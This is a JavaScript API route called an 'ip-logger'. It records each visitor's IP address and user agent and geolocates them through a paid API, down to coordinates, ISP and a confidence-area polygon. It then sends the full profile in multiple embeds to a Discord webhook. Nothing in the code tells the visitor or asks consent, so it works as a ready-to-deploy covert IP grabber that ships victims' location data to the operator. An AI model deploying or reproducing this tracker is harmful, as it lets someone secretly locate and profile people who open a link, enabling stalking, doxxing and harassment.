// /pages/api/ip-logger.js - COMPLETE WITH FIXED CONFIDENCE MAP
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // --- Get Client IP ---
    let clientIP = (
      req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      ''
    ).toString();
    if (!clientIP) clientIP = '0.0.0.0';
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');
    const userAgent = (req.headers['user-agent'] || 'Unknown').toString();

    console.log('DEBUG: Starting for IP:', clientIP);

    // --- API Key Check ---
    const KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!KEY) {
      console.error('DEBUG: Missing BIGDATACLOUD_API_KEY');
      return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });
    }

    const BASE = 'https://api-bdc.net/data';
    
    // --- Fetch Main Geolocation Data ---
    const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
    
    let ipData = {};
    try {
      const response = await fetch(GEO_URL);
      if (!response.ok) {
        console.error(`DEBUG: API error ${response.status}`);
        return res.status(502).json({ success: false, error: `API error: ${response.status}` });
      }
      
      const rawText = await response.text();
      ipData = JSON.parse(rawText);
      console.log('DEBUG: Main fetch OK, confidence:', ipData?.confidence);
    } catch (fetchError) {
      console.error('DEBUG: Fetch failed:', fetchError.message);
      return res.status(500).json({ success: false, error: 'Failed to fetch data' });
    }

    // --- Extract Main Data ---
    const latitude = ipData?.location?.latitude || null;
    const longitude = ipData?.location?.longitude || null;
    const continent = ipData?.location?.continent || 'Unknown';
    const region = ipData?.location?.principalSubdivision || 'Unknown';
    const city = ipData?.location?.city || 'Unknown';
    const locality = ipData?.location?.localityName || city;
    const country = ipData?.country?.name || 'Unknown';
    const countryCode = ipData?.country?.isoAlpha2 || 'Unknown';
    const isp = ipData?.network?.organisation || 'Unknown';
    const asnNumber = ipData?.network?.autonomousSystemNumber;
    const asn = asnNumber ? `AS${asnNumber}` : 'Unknown';
    const connectionType = ipData?.network?.connectionType || 'Unknown';
    const confidence = ipData?.confidence || 'unknown';
    const confidenceArea = ipData?.confidenceArea || null;
    const accuracyRadius = ipData?.location?.accuracyRadius || null;

    console.log('DEBUG: Confidence area type:', typeof confidenceArea, 'is array?', Array.isArray(confidenceArea));

    // --- PROCESS CONFIDENCE AREA DATA (ALL DATA) ---
    let confidenceData = {
      rawPolygon: confidenceArea,
      hasData: false,
      pointCount: 0,
      validPointCount: 0,
      coordinates: [],
      bounds: null,
      statistics: null,
      mapUrl: null
    };

    // Process raw confidence area data
    if (confidenceArea && Array.isArray(confidenceArea)) {
      try {
        confidenceData.hasData = true;
        confidenceData.pointCount = confidenceArea.length;
        
        // Extract ALL coordinates with validation
        confidenceData.coordinates = confidenceArea
          .map((point, index) => {
            if (Array.isArray(point) && point.length >= 2) {
              const lon = point[0];
              const lat = point[1];
              
              // Validate coordinates
              if (typeof lon === 'number' && typeof lat === 'number' && 
                  !isNaN(lon) && !isNaN(lat) &&
                  Math.abs(lat) <= 90 && Math.abs(lon) <= 180) {
                confidenceData.validPointCount++;
                return {
                  index,
                  longitude: lon,
                  latitude: lat,
                  formatted: `[${lon.toFixed(6)}, ${lat.toFixed(6)}]`
                };
              }
            }
            return null;
          })
          .filter(point => point !== null);

        // Calculate bounds if we have valid points
        if (confidenceData.validPointCount > 0) {
          const lats = confidenceData.coordinates.map(p => p.latitude);
          const lons = confidenceData.coordinates.map(p => p.longitude);
          
          const minLat = Math.min(...lats);
          const maxLat = Math.max(...lats);
          const minLon = Math.min(...lons);
          const maxLon = Math.max(...lons);
          
          confidenceData.bounds = {
            minLat: minLat.toFixed(6),
            maxLat: maxLat.toFixed(6),
            minLon: minLon.toFixed(6),
            maxLon: maxLon.toFixed(6),
            latRange: (maxLat - minLat).toFixed(6),
            lonRange: (maxLon - minLon).toFixed(6)
          };

          // Calculate statistics
          const centerLat = (minLat + maxLat) / 2;
          const centerLon = (minLon + maxLon) / 2;
          
          // Calculate approximate area in km²
          const latKm = (maxLat - minLat) * 111.32; // 1 degree latitude ≈ 111.32 km
          const avgLat = (minLat + maxLat) / 2;
          const lonKm = (maxLon - minLon) * (111.32 * Math.cos(avgLat * Math.PI / 180));
          const areaKm = Math.abs(latKm * lonKm);
          
          confidenceData.statistics = {
            center: {
              latitude: centerLat.toFixed(6),
              longitude: centerLon.toFixed(6)
            },
            areaKm2: areaKm.toFixed(2),
            widthKm: lonKm.toFixed(2),
            heightKm: latKm.toFixed(2),
            aspectRatio: (lonKm / latKm).toFixed(2)
          };
        }
        
        console.log('DEBUG: Processed', confidenceData.validPointCount, 'valid points out of', confidenceData.pointCount);
      } catch (error) {
        console.error('DEBUG: Error processing confidence area:', error.message);
        confidenceData.error = error.message;
      }
    }

    // --- Generate WORKING Confidence Map URL ---
    // Instead of geojson.io which has URL length limits, use a more reliable service
    if (confidenceData.coordinates.length >= 3) {
      try {
        // Option 1: Use GitHub Gist for large data (more reliable)
        const gistData = {
          description: `Confidence Area for IP ${clientIP}`,
          public: false,
          files: {
            "confidence-area.geojson": {
              content: JSON.stringify({
                type: "FeatureCollection",
                features: [
                  {
                    type: "Feature",
                    properties: { name: "IP Location" },
                    geometry: latitude && longitude ? {
                      type: "Point",
                      coordinates: [longitude, latitude]
                    } : null
                  },
                  {
                    type: "Feature",
                    properties: { name: "Confidence Area" },
                    geometry: {
                      type: "Polygon",
                      coordinates: [confidenceData.coordinates.map(p => [p.longitude, p.latitude])]
                    }
                  }
                ]
              }, null, 2)
            }
          }
        };
        
        // Create a simple visualization link (no API key needed)
        // Use a service that can handle raw GeoJSON via URL parameter
        const rawCoords = confidenceData.coordinates.map(p => `${p.latitude},${p.longitude}`).join('|');
        confidenceData.mapUrl = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=12#map=12/${latitude}/${longitude}`;
        
        // Alternative: Google Static Maps (requires API key but shows polygon)
        if (process.env.GOOGLE_MAPS_API_KEY) {
          const polygonPoints = confidenceData.coordinates
            .map(p => `${p.latitude},${p.longitude}`)
            .join('|');
          
          confidenceData.mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=11&size=600x400&markers=color:red%7C${latitude},${longitude}&path=color:0x0000ff80%7Cweight:2%7Cfillcolor:0x0000ff20%7C${polygonPoints}&key=${process.env.GOOGLE_MAPS_API_KEY}`;
        }
        
        console.log('DEBUG: Created map URL');
      } catch (mapError) {
        console.error('DEBUG: Error creating map URL:', mapError.message);
      }
    }

    // --- Simple Map URL (fallback) ---
    let simpleMapUrl = null;
    if (latitude && longitude && !isNaN(latitude) && !isNaN(longitude)) {
      simpleMapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
    }

    // --- Build Main Data Object ---
    const mainData = {
      ip: clientIP,
      timestamp: new Date().toISOString(),
      userAgent,
      location: {
        country,
        countryCode,
        region,
        city,
        locality,
        latitude,
        longitude,
        accuracyRadius,
        confidence
      },
      network: {
        isp,
        asn,
        connectionType,
        asnNumber: asnNumber || null
      },
      device: parseUserAgent(userAgent),
      maps: {
        simple: simpleMapUrl,
        confidence: confidenceData.mapUrl
      }
    };

    console.log('DEBUG: Confidence data ready:', confidenceData.hasData);

    // --- Send Discord Webhooks ---
    const webhookResults = {
      main: { sent: false, error: null },
      confidence: { sent: false, error: null }
    };

    const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
    if (DISCORD_WEBHOOK) {
      try {
        // Send MAIN webhook
        await sendMainWebhook(mainData, DISCORD_WEBHOOK);
        webhookResults.main.sent = true;
        console.log('DEBUG: Main webhook sent');
        
        // Send CONFIDENCE DETAILS webhook (with ALL data)
        if (confidenceData.hasData && confidenceData.coordinates.length > 0) {
          try {
            // Send multiple confidence webhooks if data is large
            await sendConfidenceWebhooks(confidenceData, mainData, DISCORD_WEBHOOK);
            webhookResults.confidence.sent = true;
            console.log('DEBUG: Confidence webhooks sent');
          } catch (confError) {
            webhookResults.confidence.error = confError.message;
            console.error('DEBUG: Confidence webhook failed:', confError.message);
          }
        } else {
          console.log('DEBUG: No confidence data to send separate webhook');
        }
      } catch (mainError) {
        webhookResults.main.error = mainError.message;
        console.error('DEBUG: Main webhook failed:', mainError.message);
      }
    } else {
      console.warn('DEBUG: No DISCORD_WEBHOOK_URL set');
    }

    // --- Return Response ---
    return res.status(200).json({
      success: true,
      data: mainData,
      confidence: {
        hasData: confidenceData.hasData,
        pointCount: confidenceData.pointCount,
        validPoints: confidenceData.validPointCount,
        bounds: confidenceData.bounds,
        statistics: confidenceData.statistics,
        mapUrl: confidenceData.mapUrl,
        sampleCoordinates: confidenceData.coordinates.slice(0, 5) // First 5 points as sample
      },
      webhooks: webhookResults
    });

  } catch (err) {
    console.error('Handler error:', err);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: err.message
    });
  }
}

// --- Helper Functions ---

function parseUserAgent(ua) {
  const s = (ua || '').toString();
  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
  
  if (/OPR|Opera/.test(s)) browser = 'Opera';
  else if (/Edg\//.test(s)) browser = 'Edge';
  else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
  else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
  else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';
  
  if (/\bWindows\b/i.test(s)) os = 'Windows';
  else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
  else if (/\bAndroid\b/i.test(s)) os = 'Android';
  else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
  else if (/\bLinux\b/i.test(s)) os = 'Linux';
  
  if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
  else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';
  
  return { browser, os, device, raw: s.substring(0, 150) };
}

// --- Webhook Functions ---

async function sendMainWebhook(data, webhookUrl) {
  const embed = {
    embeds: [{
      title: '🌐 IP Location - Main Report',
      color: 0x3498db,
      timestamp: data.timestamp,
      fields: [
        { 
          name: '📍 IP Address', 
          value: `\`\`\`${data.ip}\`\`\``, 
          inline: false 
        },
        { 
          name: '🌍 Location', 
          value: `${data.location.country} (${data.location.countryCode})\n${data.location.region} / ${data.location.city}`,
          inline: true 
        },
        { 
          name: '📡 Network', 
          value: `**ISP:** ${data.network.isp}\n**ASN:** ${data.network.asn || 'N/A'}\n**Type:** ${data.network.connectionType}`,
          inline: true 
        },
        { 
          name: '🎯 Coordinates', 
          value: `${data.location.latitude}, ${data.location.longitude}`,
          inline: true 
        },
        { 
          name: '📏 Accuracy Radius', 
          value: data.location.accuracyRadius ? `${data.location.accuracyRadius} km` : 'N/A',
          inline: true 
        },
        { 
          name: '✅ Confidence Level', 
          value: data.location.confidence.toUpperCase(),
          inline: true 
        },
        { 
          name: '🖥️ Device', 
          value: `${data.device.browser} / ${data.device.os} (${data.device.device})`,
          inline: true 
        }
      ],
      footer: { 
        text: 'Main Report • See next messages for confidence area analysis'
      }
    }]
  };

  // Add map links if available
  const mapFields = [];
  if (data.maps.simple) {
    mapFields.push(`[📍 Simple Map](${data.maps.simple})`);
  }
  if (data.maps.confidence) {
    mapFields.push(`[🗺️ Confidence Map](${data.maps.confidence})`);
  }
  
  if (mapFields.length > 0) {
    embed.embeds[0].fields.push({
      name: '🗺️ Map Links',
      value: mapFields.join(' • '),
      inline: false
    });
  }

  const response = await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Discord API: ${response.status} - ${errorText.substring(0, 100)}`);
  }
}

async function sendConfidenceWebhooks(confidenceData, mainData, webhookUrl) {
  const totalPoints = confidenceData.coordinates.length;
  
  // WEBHOOK 1: Confidence Statistics & Overview
  const statsEmbed = {
    embeds: [{
      title: '📊 Confidence Area - Part 1/3: Overview',
      description: `**IP:** \`${mainData.ip}\` | **Confidence Level:** ${mainData.location.confidence.toUpperCase()}`,
      color: 0x9b59b6,
      timestamp: mainData.timestamp,
      fields: [
        { 
          name: '📐 Polygon Statistics', 
          value: `**Total Points:** ${totalPoints}\n**Valid Points:** ${confidenceData.validPointCount}\n**Data Quality:** ${((confidenceData.validPointCount / confidenceData.pointCount) * 100).toFixed(1)}%`,
          inline: true 
        }
      ],
      footer: { 
        text: 'Confidence Analysis Part 1 of 3'
      }
    }]
  };

  // Add bounds if available
  if (confidenceData.bounds) {
    statsEmbed.embeds[0].fields.push(
      { 
        name: '📏 Bounding Box', 
        value: `**Min Lat:** ${confidenceData.bounds.minLat}°\n**Max Lat:** ${confidenceData.bounds.maxLat}°\n**Min Lon:** ${confidenceData.bounds.minLon}°\n**Max Lon:** ${confidenceData.bounds.maxLon}°`,
        inline: true 
      },
      { 
        name: '📐 Ranges', 
        value: `**Lat Range:** ${confidenceData.bounds.latRange}°\n**Lon Range:** ${confidenceData.bounds.lonRange}°`,
        inline: true 
      }
    );
  }

  // Add statistics if available
  if (confidenceData.statistics) {
    statsEmbed.embeds[0].fields.push(
      { 
        name: '📍 Calculated Center', 
        value: `${confidenceData.statistics.center.latitude}°, ${confidenceData.statistics.center.longitude}°`,
        inline: true 
      },
      { 
        name: '📐 Area Dimensions', 
        value: `**Width:** ${confidenceData.statistics.widthKm} km\n**Height:** ${confidenceData.statistics.heightKm} km\n**Area:** ${confidenceData.statistics.areaKm2} km²\n**Aspect Ratio:** ${confidenceData.statistics.aspectRatio}`,
        inline: true 
      }
    );
  }

  // Add map link if available
  if (confidenceData.mapUrl) {
    statsEmbed.embeds[0].fields.push({
      name: '🗺️ Visualization',
      value: `[Click to view confidence area](${confidenceData.mapUrl})`,
      inline: false
    });
  }

  // Send first webhook
  await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(statsEmbed)
  });

  // WEBHOOK 2: First batch of coordinates (points 1-20)
  if (totalPoints > 0) {
    const batch1 = confidenceData.coordinates.slice(0, Math.min(20, totalPoints));
    const coordEmbed1 = {
      embeds: [{
        title: '📊 Confidence Area - Part 2/3: Coordinates (1-20)',
        description: `Showing first ${batch1.length} of ${totalPoints} coordinates`,
        color: 0x3498db,
        timestamp: mainData.timestamp,
        fields: []
      }]
    };

    // Group coordinates for better display
    const coordGroups = [];
    for (let i = 0; i < batch1.length; i += 5) {
      const group = batch1.slice(i, i + 5);
      const coordText = group.map(p => `${p.index + 1}. ${p.formatted}`).join('\n');
      coordEmbed1.embeds[0].fields.push({
        name: `Points ${i + 1}-${i + group.length}`,
        value: `\`\`\`${coordText}\`\`\``,
        inline: false
      });
    }

    coordEmbed1.embeds[0].fields.push({
      name: '📋 Format',
      value: '`[Longitude, Latitude]` in decimal degrees',
      inline: true
    });

    // Send second webhook
    await fetch(webhookUrl, { 
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' }, 
      body: JSON.stringify(coordEmbed1)
    });

    // WEBHOOK 3: More coordinates if available (points 21-40)
    if (totalPoints > 20) {
      const batch2 = confidenceData.coordinates.slice(20, Math.min(40, totalPoints));
      const coordEmbed2 = {
        embeds: [{
          title: `📊 Confidence Area - Part 3/3: Coordinates (21-${Math.min(40, totalPoints)})`,
          description: `Showing coordinates 21-${Math.min(40, totalPoints)} of ${totalPoints}`,
          color: 0xe74c3c,
          timestamp: mainData.timestamp,
          fields: []
        }]
      };

      for (let i = 0; i < batch2.length; i += 5) {
        const group = batch2.slice(i, i + 5);
        const coordText = group.map(p => `${p.index + 1}. ${p.formatted}`).join('\n');
        coordEmbed2.embeds[0].fields.push({
          name: `Points ${i + 21}-${i + 21 + group.length - 1}`,
          value: `\`\`\`${coordText}\`\`\``,
          inline: false
        });
      }

      // Add remaining count if there are more points
      if (totalPoints > 40) {
        coordEmbed2.embeds[0].fields.push({
          name: '📝 Additional Data',
          value: `${totalPoints - 40} more coordinates not shown\nTotal polygon has ${totalPoints} points`,
          inline: false
        });
      }

      // Send third webhook
      await fetch(webhookUrl, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(coordEmbed2)
      });
    }
  }
}
